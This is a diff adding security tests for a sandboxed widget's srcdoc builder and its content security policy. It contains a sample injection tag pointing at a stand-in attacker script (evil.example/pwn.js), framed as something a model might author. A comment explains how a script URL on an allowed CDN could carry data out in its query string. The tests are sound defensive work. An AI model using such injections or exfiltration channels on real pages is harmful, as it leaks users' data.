@@ -87,4 +87,68 @@ describe('widgetSrcdoc', () => {
     expect(THEME_VAR_NAMES).toContain('--accent')
     expect(THEME_VAR_NAMES).toContain('--danger')
   })
+
+  it('does not convert a model-authored placeholder meta into a script tag', () => {
+    // Security: a model could try to inject a <meta name="x-script-placeholder">
+    // hoping the post-serialization replace turns it into a <script src>.
+    // The non-global replace only hits the first (head) occurrence, and DOM
+    // attribute serialization HTML-escapes the name value, but this test pins
+    // the invariant explicitly.
+    const malicious = '<meta name="x-script-placeholder" data-src="https://evil.example/pwn.js">'
+    const out = buildSrcdoc({ html: malicious, themeVars: {}, mode: 'dark' })
+    // The trusted Tailwind script SHOULD exist (from the head placeholder),
+    // carrying the CORS + failure-signal attributes (see the PNA test below).
+    expect(out).toContain(
+      '<script src="http://localhost:6776/vendor/tailwindcss-browser.js" crossorigin="anonymous"',
+    )
+    // The model's attempted injection must NOT become a <script> tag —
+    // it remains as an inert <meta> in the body (no executable consequence).
+    expect(out).not.toContain('<script src="https://evil.example/pwn.js">')
+  })
+
+  it('loads the runtime via CORS and signals a load failure (PNA)', () => {
+    // The sandboxed iframe is a null-origin NON-secure context, and on the
+    // default deployment the runtime src is a loopback address — Chrome's
+    // Private Network Access policy blocks that load unless it goes through
+    // CORS (crossorigin="anonymous") so the gateway's Access-Control-Allow-*
+    // approval can apply (issue #6181).
+    const out = buildSrcdoc({ html: '<p>hi</p>', themeVars: {}, mode: 'dark' })
+    expect(out).toContain('crossorigin="anonymous"')
+    // A failed load must announce itself so the loading overlay can uncover
+    // the widget immediately instead of hanging on the 15s backstop.
+    expect(out).toContain('window.__mcTwError=1')
+    expect(out).toContain('mc-tw-error')
+  })
+})
+
+describe("the dashboard document's script policy", () => {
+  // `connect-src 'none'` stops fetch and WebSocket, but a permitted script ORIGIN
+  // is a second channel: a page can append
+  // `<script src="https://cdn.jsdelivr.net/x.js?d=<encoded fields>">` and the
+  // browser sends that query out. For a widget that is the accepted trade -- the
+  // author is the person reading it. A crewmate's dashboard is filled with that
+  // crewmate's own task titles, summaries and costs, and since the preview/apply
+  // pair the page can be written by an agent and accepted by somebody who read the
+  // rendering rather than the markup.
+  const CDN = ['https://cdn.jsdelivr.net', 'https://cdnjs.cloudflare.com']
+
+  const cspOf = (doc: string): string =>
+    /content="([^"]*default-src[^"]*)"/.exec(doc)?.[1] ?? ''
+
+  it('drops the CDN script origins when offlineScripts is set', () => {
+    const csp = cspOf(
+      buildSrcdoc({ html: '<p>x</p>', themeVars: {}, mode: 'dark', offlineScripts: true }),
+    )
+    expect(csp).not.toBe('')
+    for (const origin of CDN) expect(csp).not.toContain(origin)
+    // Inline script still runs: a chart is script or it is nothing, and the page
+    // draws its own.
+    expect(csp).toContain("script-src 'unsafe-inline'")
+    expect(csp).toContain("connect-src 'none'")
+  })
+
+  it('leaves every other widget surface alone', () => {
+    const csp = cspOf(buildSrcdoc({ html: '<p>x</p>', themeVars: {}, mode: 'dark' }))
+    for (const origin of CDN) expect(csp).toContain(origin)
+  })
 })
